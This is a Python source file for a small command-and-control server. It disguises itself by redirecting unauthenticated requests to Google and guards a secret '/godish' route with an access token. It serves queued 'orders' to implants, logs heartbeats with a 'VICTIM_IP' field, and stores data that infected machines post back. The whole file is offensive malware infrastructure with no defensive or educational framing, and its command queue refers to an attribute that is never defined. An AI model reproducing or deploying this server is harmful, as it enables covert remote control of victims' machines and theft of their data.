import json
import os
from datetime import datetime
from http.server import BaseHTTPRequestHandler

# -------------------------
# Config
# -------------------------

REDIRECT_URL = os.getenv("REDIRECT_URL", "https://www.google.com")
ACCESS_TOKEN = os.getenv(
    "ACCESS_TOKEN",
    "i_am_the_alpha_and_the_omega_the_first_and_the_last_the_beginning_and_the_end",
)

ROUTE_PREFIX = "/godish"

body = b"0"


class MadaraHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    # -------------------------
    # Utilities
    # -------------------------

    def log_request(self, code="-", size="-"):
        pass

    def redirect(self, url=REDIRECT_URL, code=302):
        self.send_response(code)
        self.send_header("Location", url)
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "close")
        self.end_headers()

    def is_authorized(self):
        return (
            self.path.startswith(ROUTE_PREFIX)
            and self.headers.get("X-Access-Token") == ACCESS_TOKEN
        )

    def save_json(self, data, filename="seen.json"):
        try:
            with open(filename, "a", encoding="utf-8") as f:
                json.dump(data, f)
                f.write("\n")
        except Exception as e:
            print(f"Save error: {e}")

    def save_text(self, text, filename="output.txt"):
        try:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            with open(filename, "a", encoding="utf-8") as f:
                f.write(timestamp + text)
                if not text.endswith("\n"):
                    f.write("\n")
        except Exception as e:
            print(f"Save error: {e}")

    def get_action(self):
        if "?type=" not in self.path:
            return None
        return self.path.split("?type=", 1)[1].split("&", 1)[0]

    # -------------------------
    # GET
    # -------------------------

    def do_GET(self):
        if not self.is_authorized():
            self.redirect()
            return

        action = self.get_action()

        # Fetch commands
        if action == "orders":
            body = "\n".join(self.queue)

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body.encode())))
            self.end_headers()
            # print(self.queue)
            # print(repr(body))
            self.wfile.write(body.encode())
            return

        self.redirect()

    # -------------------------
    # POST
    # -------------------------

    def do_POST(self):
        if not self.is_authorized():
            self.redirect()
            return

        action = self.get_action()

        # Heartbeat
        if action == "beat":
            heartbeat = {
                "VICTIM_IP": self.client_address[0],
                "TIME": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

            self.save_json(heartbeat)

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        if action == "something":
            content_length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(content_length).decode("utf-8", errors="replace")

            self.save_text(data)

            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        self.redirect()
